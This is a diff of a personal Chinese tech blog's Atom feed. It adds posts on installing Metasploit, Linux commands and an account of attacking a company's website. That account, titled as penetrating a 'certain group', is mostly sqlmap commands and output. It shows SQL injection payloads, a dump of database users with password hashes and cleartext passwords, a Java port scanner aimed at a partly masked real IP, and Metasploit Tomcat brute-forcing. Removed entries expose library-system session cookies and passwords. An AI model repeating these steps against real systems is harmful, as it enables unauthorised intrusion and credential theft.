@@ -4,7 +4,7 @@
   <title><![CDATA[K]]></title>
   <link href="http://mzkmzk.github.io/atom.xml" rel="self"/>
   <link href="http://mzkmzk.github.io/"/>
-  <updated>2015-07-17T00:00:28+08:00</updated>
+  <updated>2015-07-20T02:51:47+08:00</updated>
   <id>http://mzkmzk.github.io/</id>
   <author>
     <name><![CDATA[K]]></name>
@@ -12,6 +12,277 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[metasploit 安装]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/07/19/metasploit_install/"/>
+    <updated>2015-07-19T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/07/19/metasploit_install</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<p>注意点</p>
+
+<ol>
+<li>一定要注意教程的最低配置设定</li>
+<li>安装到最后会有个获取验证码..我试过qq、新浪和gmail都无法获取验证码,听说一定要企业邮箱 例如139(我还没尝试),别人给的我一个使用吗QWYW-M386-29JQ-PHMW</li>
+</ol>
+
+
+<h3>0x00下载地址</h3>
+
+<p><a href="http://www.rapid7.com/products/metasploit/download.jsp">http://www.rapid7.com/products/metasploit/download.jsp</a></p>
+
+<h3>0x01 教程下载地址</h3>
+
+<p><a href="https://community.rapid7.com/docs/DOC-2100">https://community.rapid7.com/docs/DOC-2100</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[sqlmap 渗透某集团]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/07/18/sqlmap_zhongxin.markdonw/"/>
+    <updated>2015-07-18T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/07/18/sqlmap_zhongxin.markdonw</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>0x00 找到盲注点</h3>
+
+<p>参考链接<a href="http://bluereader.org/article/59585524">http://bluereader.org/article/59585524</a></p>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --dbs
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Parameter: fax_id (GET)
+Type: UNION query
+Title: MySQL UNION query (NULL) - 4 columns
+Payload: fax_id=1' UNION ALL SELECT NULL,CONCAT(0x71786a7a71,0x72514471566c4b56546f,0x71706a7871),NULL,NULL#
+
+Type: AND/OR time-based blind
+Title: MySQL &gt; 5.0.11 AND time-based blind (SELECT)
+Payload: fax_id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))dCsX) AND 'uYLq'='uYLq
+---
+
+available databases [3]:                                                       
+[*] information_schema
+[*] mysql
+[*] mysql3235
+</code></pre>
+
+<h3>0x01 查看数据库表和数据</h3>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --tables
+</code></pre>
+
+<p>就会得到数据库中的所有表,然后我随即抽了一个schedule表查看数据</p>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --dump -T schedule
+</code></pre>
+
+<p>但是结果不如人意</p>
+
+<pre><code>[13:27:41] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+
+Database: mysql3235
+Table: schedule
+[0 entries]
++-------+---------+-----------+
+| TITLE | ENDTIME | STARTTIME |
++-------+---------+-----------+
++-------+---------+-----------+
+</code></pre>
+
+<h3>0x02 尝试爆破数据库密码</h3>
+
+<p>获取数据库用户</p>
+
+<pre><code> python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --users
+
+database management system users [5]:                                          
+[*] ''@'localhost'
+[*] 'cubetech'@'localhost'
+[*] 'debugger'@'localhost'
+[*] 'root'@'127.0.0.1'
+[*] 'root'@'localhost'
+</code></pre>
+
+<p>获取数据库密码</p>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --users --passwords
+
+database management system users password hashes:                              
+[*] cubetech [1]:
+password hash: *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
+clear-text password: 123456
+[*] debugger [1]:
+password hash: *6D45DF82DF6169868F43DD422AB3229D376BD1BE
+clear-text password: debugger
+[*] root [1]:
+password hash: *1532B21FE550E115F113DAA9A26D0EEEEF8DEDC7
+</code></pre>
+
+<h3>0x03 探索Mysql端口</h3>
+
+<p>知道了数据库用户名和端口后 我就尝试远程链接数据库了.ip很容易得到. 应该是服务器本身 .这样的服务器管理员应该是不会做服务器和数据库分离的 .</p>
+
+<p>尝试了mysql的3306端口 失败!</p>
+
+<p>写了个java扫描哪些端口开启&hellip;</p>
+
+<pre><code>import java.net.Socket;
+
+import java.util.ArrayList;
+import java.util.List;
+
+
+public class Check_Open_Port {
+public static void main(String args[]) {
+    final List&lt;Integer&gt; li = new ArrayList&lt;Integer&gt;();
+    for (int i = 0; i &lt;= 65535; i++) {
+        li.add(i);
+    }
+
+    for (int i = 0; i &lt;= 100; i++) {
+        new Thread() {
+            public void run() {
+                while (li.size() != 0) {
+                    int li_get = 0;
+                    int num = (int) Math.floor(Math.random()* (li.size()));
+                    try {
+                        li_get = li.get(num);
+                        int num_remove_check =li.indexOf(li_get);
+                        if(num_remove_check!=-1)
+                        li.remove(num_remove_check);
+                        Socket client = new Socket("122.233.243.***",
+                                li_get);
+                        System.out.println("端口 : " + li_get + "已开放");
+                        client.close();
+                    } catch (Exception e) {
+                        System.out.println("端口 : " + li_get + "未开放");
+                    }
+                }
+            }
+        }.start();
+    }
+    //检测ip有无被封锁 和当前集合个数
+    new Thread() {
+        public void run() {
+            while (li.size() != 0) {
+                try {
+                    Socket client = new Socket("122.233.243.***", 80);
+                    System.out.println("端口 : " + 80 + "已开放");
+                    client.close();
+
+                } catch (Exception e) {
+                    System.out.println("端口 : " + 80 + "未开放");
+                }
+                System.out.println("当前集合个数 : "+li.size());
+                try {
+                    join(50000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+    }.start();
+}
+}
+</code></pre>
+
+<p>扫了好久..结果发现没有扫到 原因有两个</p>
+
+<ol>
+<li><p>其实扫到了 不过控制台信息太多了 把扫到的端口顶掉了 我应该把输出写到一个log里</p></li>
+<li><p>就是并发线程没控制好.一个线程remove list数据的时候,另外一个线程已经remove了.然后数据在List的位置就会改变,导致漏了好多端口.我应该做线程锁,或者写map的 检查过就把value设成true.</p></li>
+</ol>
+
+
+<p>好了扫描端口其实只是一个尝试,并没有太多技术含量.我决定要从Tomcat入手.尝试用metasploit破解Tomcat</p>
+
+<h3>0x04 metasploit 入侵Tomcat</h3>
+
+<p>终端输入</p>
+
+<pre><code>msfconsole
+</code></pre>
+
+<p>设置入侵Tomcat</p>
+
+<pre><code>msf &gt; use auxiliary/scanner/http/tomcat_mgr_login
+msf auxiliary(tomcat_mgr_login) &gt; set RHoSTS 122.233.243.***
+RHoSTS =&gt; 122.233.243.***
+msf auxiliary(tomcat_mgr_login) &gt; set RPORT 80
+RPORT =&gt; 80
+msf auxiliary(tomcat_mgr_login) &gt; run
+</code></pre>
+
+<p>结果并没有破解出密码- -.</p>
+
+<p>参考文章<a href="http://www.rising.com.cn/newsletter/news/2013-03-01/13256.html">http://www.rising.com.cn/newsletter/news/2013-03-01/13256.html</a></p>
+
+<h3>0x05 再次尝试利用 metasploit 检测出 数据库端口</h3>
+
+<pre><code>msf &gt; nmap -Pn -sV 122.233.243.***
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-19 23:05 CST
+
+Nmap scan report for 122.233.243.***
+Host is up (0.13s latency).
+Not shown: 991 filtered ports
+
+PORT      STATE  SERVICE           VERSION
+80/tcp    open   http              Apache Tomcat/Coyote JSP engine 1.1
+135/tcp   closed msrpc
+139/tcp   closed netbios-ssn
+593/tcp   closed http-rpc-epmap
+3389/tcp  open   ms-wbt-server     Microsoft Terminal Service
+4444/tcp  closed krb524
+6059/tcp  open   tcpwrapped
+10000/tcp open   snet-sensor-mgmt?
+10010/tcp open   rxapi?
+Service Info: OS: Windows
+</code></pre>
+
+<p>好像并没有我们想得到的</p>
+
+<h3>0x06 穷途末路的我尝试了下mysql扫描</h3>
+
+<pre><code>msf auxiliary(tomcat_mgr_login) &gt; use auxiliary/scanner/mysql/mysql_login
+msf auxiliary(mysql_login) &gt; set RHOSTS 122.233.243.***
+RHOSTS =&gt; 122.233.243.***
+msf auxiliary(mysql_login) &gt; run
+
+[-] 122.233.243.***:3306 MYSQL - Unable to connect: The connection timed out (122.233.243.***:3306).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+
+<p>其实傻子也知道不可以- -因为看了下<code>info</code>扫的端口是3306 怎么可能可以&hellip;.</p>
+
+<p>参考链接<a href="http://www.bubuko.com/infodetail-343797.html">http://www.bubuko.com/infodetail-343797.html</a></p>
+
+<h3>0x07 利用sql-shell查端口</h3>
+
+<pre><code>show variables like 'port';
+
+or
+
+select * from global_variables where VARIABLE_NAME ='PORT';
+</code></pre>
+
+<p>上面2个命令都可以查询端口,但是global_variables表属于临时表,只在当前连接下显示,所以无法利用 但是还是想通过insert 插入到一个表中</p>
+
+<pre><code>python sqlmap.py -u "http://www.*.net/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=1" --sql-shell  "SELECT  'global_variables'" -v 5 
+
+insert into hr_event(name) select VARIABLE_NAME from information_schema.global_variables where VARIABLE_NAME ='PORT';
+[02:46:34] [WARNING] execution of custom SQL queries is only available when stacked queries are supported
+</code></pre>
+
+<p>通过sqlmap执行的sql-shell只能执行简单的查询,所以此法无效</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[网站 seo的开始]]></title>
@@ -2635,6 +2906,46 @@ tools:context="com.tjrac.MainActivity" &gt;
   </entry>
   
   <entry>
+    <title type="html"><![CDATA[Linux 常用命令]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/05/18/Linux_Order/"/>
+    <updated>2015-05-18T21:28:46+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/05/18/Linux_Order</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>sheel相关</h3>
+
+<pre><code>#set        查看所有变量
+#export     查看所有环境变量
+#printenv   查看所有环境变量
+</code></pre>
+
+<h3>Linux装逼命令</h3>
+
+<pre><code>cat /dev/urandom | hexdump -C | grep "ca fe" 
+</code></pre>
+
+<hr />
+
+<h1>工具安装</h1>
+
+<h3>ssh</h3>
+
+<ol>
+<li>安装客户端<code>sudo apt-get install openssh-client</code></li>
+<li>安装服务端<code>sudo apt-get install openssh-server</code></li>
+<li>开启服务<code>/etc/init.d/ssh start</code></li>
+<li>检测服务端口和开启情况<code>ps -e |grep ssh</code></li>
+<li>登陆ssh<code>ssh username@ip</code></li>
+<li>修改配置信息<code>vim /etc/ssh/sshd_config</code></li>
+</ol>
+
+
+<p>参考连接<a href="http://www.cnblogs.com/nodot/archive/2011/06/10/2077595.html">http://www.cnblogs.com/nodot/archive/2011/06/10/2077595.html</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[ListView与Adapter简单试用]]></title>
     <link href="http://mzkmzk.github.io/blog/2015/05/18/listview_adapter/"/>
     <updated>2015-05-18T11:37:40+08:00</updated>
@@ -3153,227 +3464,6 @@ public static void main(String args[]){
 </code></pre></li>
 </ol>
 
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[tjrac_lib 请求状态记录]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/05/09/httpclient_tjraclib/"/>
-    <updated>2015-05-09T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/05/09/httpclient_tjraclib</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>读者推购</h3>
-
-<p>request 302</p>
-
-<pre><code>GET 
-/asord/asord_redr.php?click_type=commit&amp;title=%E4%BD%A0%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84222%E4%B8%AAC%2B%2B%E8%AF%AD%E8%A8%80%E9%97%AE%E9%A2%98&amp;a_name=%E6%9D%8E%E4%B8%96%E6%AC%A3&amp;b_pub=%E4%BA%BA%E6%B0%91%E9%82%AE%E7%94%B5%E5%87%BA%E7%89%88%E7%A4%BE&amp;b_date=2010-6&amp;b_type=C&amp;b_isbn=9787115224965&amp;b_remark= HTTP/1.1
-Host: 121.193.129.2:8080
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0
-Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://121.193.129.2:8080/asord/asord_redr.php?click_type=douban&amp;title=222&amp;a_name=&amp;b_pub=&amp;b_date=&amp;b_type=C&amp;b_isbn=&amp;b_remark=
-Cookie: TimeSelf=394348; PHPSESSID=dio52e3ql0de367g3nlnh43v42
-Connection: keep-alive
-</code></pre>
-
-<p>response 302</p>
-
-<pre><code>request:
-GET /asord/asord_redr_con.php?b_name=你必须知道的222个C++语言问题&amp;a_name=李世欣&amp;b_type=C&amp;b_pub=人民邮电出版社&amp;b_date=2010-6&amp;b_isbn=9787115224965 HTTP/1.1
-Host: 121.193.129.2:8080
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0
-Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://121.193.129.2:8080/asord/asord_redr.php?click_type=douban&amp;title=222&amp;a_name=&amp;b_pub=&amp;b_date=&amp;b_type=C&amp;b_isbn=&amp;b_remark=
-Cookie: TimeSelf=394348; PHPSESSID=dio52e3ql0de367g3nlnh43v42
-Connection: keep-alive
-</code></pre>
-
-<p>request 200</p>
-
-<pre><code>request
-GET
-/asord/asord_redr_result.php?msg=  荐购成功，感谢您参与我们的馆藏建设！&lt;br /&gt;&lt;br /&gt;  我们会通过Email及时通知你所荐购书刊的处理情况。&lt;br /&gt;&lt;br /&gt;  您也可以通过我的图书馆中的荐购历史查看您所荐购图书的处理情况。&amp;retUrl=asord_redr.php HTTP/1.1
-Host: 121.193.129.2:8080
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://121.193.129.2:8080/asord/asord_redr.php?click_type=douban&amp;title=222&amp;a_name=&amp;b_pub=&amp;b_date=&amp;b_type=C&amp;b_isbn=&amp;b_remark=
-Cookie: TimeSelf=394348; PHPSESSID=dio52e3ql0de367g3nlnh43v42
-Connection: keep-alive
-</code></pre>
-
-<h3>读者挂失</h3>
-
-<p>request</p>
-
-<pre><code>POST /reader/redr_lost_result.php HTTP/1.1
-Host: 121.193.129.2:8080
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://121.193.129.2:8080/reader/redr_lost.php
-Cookie: TimeSelf=394348; PHPSESSID=dio52e3ql0de367g3nlnh43v42
-Connection: keep-alive
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 19
-
-loss_pwd=6011203156
-</code></pre>
-
-<p>response</p>
-
-<pre><code>HTTP/1.1 200 OK
-Date: Sat, 09 May 2015 08:57:04 GMT
-Server: Apache/2.2.22 (Win32) PHP/5.2.17
-X-Powered-By: PHP/5.2.17
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
-Pragma: no-cache
-Content-Length: 3831
-Keep-Alive: timeout=5, max=100
-Connection: Keep-Alive
-Content-Type: text/html
-
-网页包含关键字挂失成功 or
-密码输入错误,请重新登陆 !
-</code></pre>
-
-<h3>修改密码</h3>
-
-<p>request</p>
-
-<pre><code>POST /reader/change_passwd_result.php HTTP/1.1
-Host: 121.193.129.2:8080
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://121.193.129.2:8080/reader/change_passwd.php
-Cookie: TimeSelf=394348;        PHPSESSID=dio52e3ql0de367g3nlnh43v42
-Connection: keep-alive
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 84
-
-old_passwd=6011203157&amp;new_passwd=554737&amp;chk_passwd=554737&amp;submit1=%E7%A1%AE%E5%AE%9A
-</code></pre>
-
-<p>response</p>
-
-<pre><code>HTTP/1.1 200 OK
-Date: Sat, 09 May 2015 09:30:33 GMT
-Server: Apache/2.2.22 (Win32) PHP/5.2.17
-X-Powered-By: PHP/5.2.17
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
-Pragma: no-cache
-Content-Length: 3837
-Keep-Alive: timeout=5, max=100
-Connection: Keep-Alive
-Content-Type: text/html
-</code></pre>
-
-<h3>续借</h3>
-
-<pre><code>GET /reader/ajax_renew.php?bar_code=RA0527003&amp;check=2DB778E6&amp;time=1430726027035 HTTP/1.1
-Host: 121.193.129.2:8080
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0
-Accept: text/html, */*; q=0.01
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-X-Requested-With: XMLHttpRequest
-Referer: http://121.193.129.2:8080/reader/book_lst.php
-Cookie: TimeSelf=393309; PHPSESSID=qd7titnifvmpstu5eg1l3fj954
-Connection: keep-alive
-
-
-GET /reader/ajax_renew.php?bar_code=RA0527003&amp;check=2DB778E6&amp;time=1430726095058 HTTP/1.1
-Host: 121.193.129.2:8080
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0
-Accept: text/html, */*; q=0.01
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-X-Requested-With: XMLHttpRequest
-Referer: http://121.193.129.2:8080/reader/book_lst.php
-Cookie: TimeSelf=393309; PHPSESSID=qd7titnifvmpstu5eg1l3fj954
-Connection: keep-alive
-</code></pre>
-
-<p>包含关键字 旧密码输入有误
-         or 您的密码修改成功,请重新登陆</p>
-
-<p>urlconde转码参考
-<a href="http://blog.csdn.net/zhh521125/article/details/6627245">http://blog.csdn.net/zhh521125/article/details/6627245</a></p>
-
-<p>下拉参考 <a href="http://imshare.iteye.com/blog/770950">http://imshare.iteye.com/blog/770950</a></p>
-
-<p>密码修改 第二次 程序奔溃
-原因应该是 修改完的密码 没有给 shara 修改完成</p>
-
-<p>推荐购买 功能实现但返回码为空</p>
-
-<p>用原来model的办法 会乱码</p>
-
-<p>出现HTML代码，一闪就过，再运行就停止了</p>
-
-<p>挂失问题 挂失了以后不再显示 输入密码</p>
-
-<p>推荐国脉获取的response的webconte为空 原因是经过了两次302跳转 先都以建构成功返回</p>
-
-<p>搜索功能出错
-    at com.tjrac.adapter.Czsj_Adapter.getCount(Czsj_Adapter.java:39)空指针</p>
-
-<p>多次按挂失 报错Login</p>
-
-<h3>搜索书籍的图片</h3>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[android 小技能]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/05/09/android_little_skill/"/>
-    <updated>2015-05-09T11:37:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/05/09/android_little_skill</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>0x00 去掉顶部自带栏</h3>
-
-<pre><code>public class MainActivity extends Activity {  
-
-@Override  
-protected void onCreate(Bundle savedInstanceState) {  
-    super.onCreate(savedInstanceState);  
-    //这句就是去掉程序的title  
-    requestWindowFeature(Window.FEATURE_NO_TITLE);  
-    setContentView(R.layout.activity_main);  
-}  
-}  
-</code></pre>
-
-<p>参考链接<a href="http://blog.csdn.net/kaypro/article/details/9858807">http://blog.csdn.net/kaypro/article/details/9858807</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Linux常用命令]]></title>
-    <link href="http://mzkmzk.github.io/blog/2015/05/08/Linux_Order/"/>
-    <updated>2015-05-08T11:40:40+08:00</updated>
-    <id>http://mzkmzk.github.io/blog/2015/05/08/Linux_Order</id>
-    <content type="html"><![CDATA[<!--more-->
-
-
-<h3>Linux装逼命令</h3>
-
-<pre><code>cat /dev/urandom | hexdump -C | grep "ca fe" 
-</code></pre>
 ]]></content>
   </entry>
   
